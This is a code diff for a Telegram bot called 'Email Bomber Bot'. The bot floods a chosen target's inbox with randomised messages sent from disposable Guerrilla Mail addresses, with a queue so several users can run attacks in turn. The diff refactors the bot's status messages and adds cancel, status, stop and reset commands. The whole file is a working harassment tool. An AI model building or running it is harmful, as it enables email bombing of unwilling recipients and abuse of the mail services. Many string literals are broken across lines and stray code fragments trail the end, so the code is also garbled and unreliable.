@@ -32,9 +32,13 @@ current_operation = None
 queue = deque()
 user_data = {}
 
+PREFIX = "[Email Bomber Bot]
+"
+
 GUERRILLA_DOMAINS = [
-    'sharklasers.com', 'grr.la', 'guerrillamail.com', 'guerrillamail.de',
-    'guerrillamail.net', 'guerrillamail.org', 'guerrillamail.biz'
+    'sharklasers.com', 'grr.la', 'guerrillamail.com',
+    'guerrillamail.de', 'guerrillamail.net',
+    'guerrillamail.org', 'guerrillamail.biz'
 ]
 
 def get_new_temp_email():
@@ -54,7 +58,10 @@ def generate_random_body():
         "Null message arrived for no reason.",
         "Entropy injection complete."
     ]
-    filler = ''.join(random.choices(string.ascii_letters + string.digits + ' .,!?', k=random.randint(30, 80)))
+    filler = ''.join(random.choices(
+        string.ascii_letters + string.digits + ' .,!?',
+        k=random.randint(30, 80)
+    ))
     return random.choice(templates) + " " + filler
 
 def send_via_guerrilla(to_email, subject, body):
@@ -89,13 +96,11 @@ def run_bomb_operation():
     sent = 0
     consecutive_fails = 0
 
-    bot.send_message(chat_id,
-        "✉️ Email Bomber Bot
-"
-        "Operation started.
-"
-        "Target: " + op['target'] + " | Messages: " + str(op['count']) + " | Delay: " + str(op['interval']) + "s"
-    )
+    msg = PREFIX + "Operation started.
+Target: " + op['target'] + "
+Messages: " + str(op['count']) + "
+Delay: " + str(op['interval']) + "s"
+    bot.send_message(chat_id, msg)
 
     start_time = datetime.now()
 
@@ -114,12 +119,8 @@ def run_bomb_operation():
             consecutive_fails += 1
 
         if consecutive_fails >= 3:
-            bot.send_message(chat_id,
-                "✉️ Email Bomber Bot
-"
-                "⚠️ Service restrictions encountered. Stopped at "
-                + str(sent) + "/" + str(op['count'])
-            )
+            msg = PREFIX + "Service restrictions hit. Stopped at " + str(sent) + "/" + str(op['count'])
+            bot.send_message(chat_id, msg)
             break
 
         if (i + 1) % 5 == 0:
@@ -130,22 +131,14 @@ def run_bomb_operation():
                 eta_sec = remaining / rate if rate > 0 else remaining * op['interval']
                 eta_min = int(eta_sec // 60)
                 eta_sec_rem = int(eta_sec % 60)
-                bot.send_message(chat_id,
-                    "✉️ Email Bomber Bot
-"
-                    "Progress: " + str(sent) + "/" + str(op['count']) + " sent
-"
-                    "ETA: " + str(eta_min) + "m " + str(eta_sec_rem) + "s remaining"
-                )
+                msg = PREFIX + "Progress: " + str(sent) + "/" + str(op['count']) + " sent
+ETA: " + str(eta_min) + "m " + str(eta_sec_rem) + "s"
+                bot.send_message(chat_id, msg)
 
         time.sleep(op['interval'])
 
-    bot.send_message(chat_id,
-        "✉️ Email Bomber Bot
-"
-        "✅ Operation completed. Messages sent: "
-        + str(sent) + "/" + str(op['count'])
-    )
+    msg = PREFIX + "Done! Messages sent: " + str(sent) + "/" + str(op['count'])
+    bot.send_message(chat_id, msg)
     current_operation = None
 
     if queue:
@@ -154,53 +147,33 @@ def run_bomb_operation():
         current_operation['sent'] = 0
         current_operation['start_time'] = datetime.now()
         threading.Thread(target=run_bomb_operation).start()
-        bot.send_message(next_req['chat_id'],
-            "✉️ Email Bomber Bot
-"
-            "U0001f680 Your turn has started.
-"
-            "Target: " + next_req['target'] + " | Messages: " + str(next_req['count'])
-        )
+        msg = PREFIX + "Your turn started!
+Target: " + next_req['target'] + "
+Messages: " + str(next_req['count'])
+        bot.send_message(next_req['chat_id'], msg)
 
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message,
-        "✉️ Email Bomber Bot
-
-"
-        "This tool sends random messages from disposable addresses.
-"
-        "Limited capacity: approximately 20-50 messages maximum.
-
-"
-        "Type /help for commands."
-    )
+    msg = PREFIX + "Welcome!
+Sends random emails from disposable addresses.
+Limit: ~20-50 messages.
+Type /help for commands."
+    bot.reply_to(message, msg)
 
 @bot.message_handler(commands=['help'])
 def help_cmd(message):
-    bot.reply_to(message,
-        "✉️ Email Bomber Bot - Commands
-
-"
-        "/target <email> - Set target email address
-"
-        "/count <number> - Set number of messages (1-100)
-"
-        "/interval <seconds> - Set delay between messages (3-30s)
-"
-        "/bomb - Start sending (requires confirmation)
-"
-        "/queue - Check queue position
-"
-        "/cancel - Remove from queue
-"
-        "/status - View current settings
-"
-        "/stop - Stop your active operation
-"
-        "/reset - Clear all settings"
-    )
+    msg = PREFIX + "Commands:
+/target <email>
+/count <number> (1-100)
+/interval <seconds> (3-30)
+/bomb - Start
+/queue - Check position
+/cancel - Leave queue
+/status - Your settings
+/stop - Stop operation
+/reset - Clear settings"
+    bot.reply_to(message, msg)
 
 @bot.message_handler(commands=['target'])
 def set_target(message):
@@ -210,19 +183,16 @@ def set_target(message):
             raise ValueError
         email = parts[1].strip()
         if '@' not in email or '.' not in email.split('@')[-1]:
-            bot.reply_to(message, "✉️ Email Bomber Bot
-❌ Invalid email format. Example: user@domain.com")
+            bot.reply_to(message, PREFIX + "Invalid email. Example: user@domain.com")
             return
         uid = message.from_user.id
         if uid not in user_data:
             user_data[uid] = {}
         user_data[uid]['target'] = email
-        bot.reply_to(message, "✉️ Email Bomber Bot
-✅ Target set: " + email + "
-Next: use /count <number>")
-    except:
-        bot.reply_to(message, "✉️ Email Bomber Bot
-Usage: /target email@example.com")
+        bot.reply_to(message, PREFIX + "Target set: " + email + "
+Next: /count <number>")
+    except Exception:
+        bot.reply_to(message, PREFIX + "Usage: /target email@example.com")
 
 @bot.message_handler(commands=['count'])
 def set_count(message):
@@ -234,11 +204,9 @@ def set_count(message):
         if uid not in user_data:
             user_data[uid] = {}
         user_data[uid]['count'] = num
-        bot.reply_to(message, "✉️ Email Bomber Bot
-✅ Message count set to " + str(num))
-    except:
-        bot.reply_to(message, "✉️ Email Bomber Bot
-Usage: /count 35  (1-100 allowed)")
+        bot.reply_to(message, PREFIX + "Count set to " + str(num))
+    except Exception:
+        bot.reply_to(message, PREFIX + "Usage: /count 35  (1-100)")
 
 @bot.message_handler(commands=['interval'])
 def set_interval(message):
@@ -250,36 +218,27 @@ def set_interval(message):
         if uid not in user_data:
             user_data[uid] = {}
         user_data[uid]['interval'] = sec
-        bot.reply_to(message, "✉️ Email Bomber Bot
-✅ Delay set to " + str(sec) + " seconds")
-    except:
-        bot.reply_to(message, "✉️ Email Bomber Bot
-Usage: /interval 5  (3-30 seconds)")
+        bot.reply_to(message, PREFIX + "Delay set to " + str(sec) + " seconds")
+    except Exception:
+        bot.reply_to(message, PREFIX + "Usage: /interval 5  (3-30 seconds)")
 
 @bot.message_handler(commands=['bomb'])
 def bomb_cmd(message):
     uid = message.from_user.id
     if uid not in user_data or 'target' not in user_data[uid] or 'count' not in user_data[uid]:
-        bot.reply_to(message, "✉️ Email Bomber Bot
-⚠️ Please set /target and /count first.")
+        bot.reply_to(message, PREFIX + "Set /target and /count first.")
         return
     interval = user_data[uid].get('interval', 3)
     target = user_data[uid]['target']
     count = user_data[uid]['count']
-    msg = bot.reply_to(message,
-        "✉️ Email Bomber Bot
-"
-        "⚠️ Confirm sending " + str(count) + " messages to " + target + " with " + str(interval) + "s delay.
-
-"
-        "Reply with YES to proceed."
-    )
+    confirm_text = PREFIX + "Confirm: Send " + str(count) + " messages to " + target + " with " + str(interval) + "s delay?
+Reply YES to start."
+    msg = bot.reply_to(message, confirm_text)
     bot.register_next_step_handler(msg, lambda m: confirm_bomb_handler(m, uid, message.chat.id, target, count, interval))
 
 def confirm_bomb_handler(message, uid, chat_id, target, count, interval):
     if message.text.strip().upper() != 'YES':
-        bot.reply_to(message, "✉️ Email Bomber Bot
-❌ Operation cancelled.")
+        bot.reply_to(message, PREFIX + "Cancelled.")
         return
     global current_operation
     with bomb_lock:
@@ -292,13 +251,8 @@ def confirm_bomb_handler(message, uid, chat_id, target, count, interval):
                 'chat_id': chat_id
             })
             pos = len(queue)
-            bot.reply_to(message,
-                "✉️ Email Bomber Bot
-"
-                "⏳ Added to queue. Position: " + str(pos) + "
-"
-                "Use /queue to check status."
-            )
+            bot.reply_to(message, PREFIX + "Added to queue. Position: " + str(pos) + "
+Use /queue to check.")
         else:
             current_operation = {
                 'user_id': uid,
@@ -315,23 +269,68 @@ def confirm_bomb_handler(message, uid, chat_id, target, count, interval):
 def queue_cmd(message):
     uid = message.from_user.id
     if not queue:
-        bot.reply_to(message, "✉️ Email Bomber Bot
-Queue is empty.")
+        bot.reply_to(message, PREFIX + "Queue is empty.")
         return
     pos = 1
     found = False
     for req in queue:
         if req['user_id'] == uid:
             found = True
-            bot.reply_to(message,
-                "✉️ Email Bomber Bot
-"
-                "Your position: " + str(pos) + " of " + str(len(queue)) + "
-"
-                "Target: " + req['target'] + "
-"
-                "Count: " + str(req['count'])
-            )
+            msg = PREFIX + "Your position: " + str(pos) + " of " + str(len(queue)) + "
+Target: " + req['target'] + "
+Count: " + str(req['count'])
+            bot.reply_to(message, msg)
+            break
+        pos += 1
+    if not found:
+        bot.reply_to(message, PREFIX + "You are not in the queue.")
+
+@bot.message_handler(commands=['cancel'])
+def cancel_cmd(message):
+    global queue
+    uid = message.from_user.id
+    old_len = len(queue)
+    queue = deque([req for req in queue if req['user_id'] != uid])
+    if len(queue) < old_len:
+        bot.reply_to(message, PREFIX + "Removed from queue.")
+    else:
+        bot.reply_to(message, PREFIX + "You were not in the queue.")
+
+@bot.message_handler(commands=['status'])
+def status_cmd(message):
+    uid = message.from_user.id
+    if uid in user_data:
+        d = user_data[uid]
+        msg = PREFIX + "Target: " + str(d.get('target', 'not set')) + "
+Count: " + str(d.get('count', 'not set')) + "
+Interval: " + str(d.get('interval', 3)) + "s
+Active: " + ("Yes" if current_operation else "No") + "
+Queue: " + str(len(queue))
+    else:
+        msg = PREFIX + "No settings yet.
+Queue: " + str(len(queue))
+    bot.reply_to(message, msg)
+
+@bot.message_handler(commands=['stop'])
+def stop_cmd(message):
+    global current_operation
+    uid = message.from_user.id
+    if current_operation and current_operation['user_id'] == uid:
+        current_operation = None
+        bot.reply_to(message, PREFIX + "Operation stopped.")
+    else:
+        bot.reply_to(message, PREFIX + "No active operation found.")
+
+@bot.message_handler(commands=['reset'])
+def reset_cmd(message):
+    uid = message.from_user.id
+    if uid in user_data:
+        del user_data[uid]
+    bot.reply_to(message, PREFIX + "All settings cleared.")
+
+
+print("Bot starting...")
+bot.infinity_polling(skip_pending=True, none_stop=True)           )
             break
         pos += 1
     if not found:
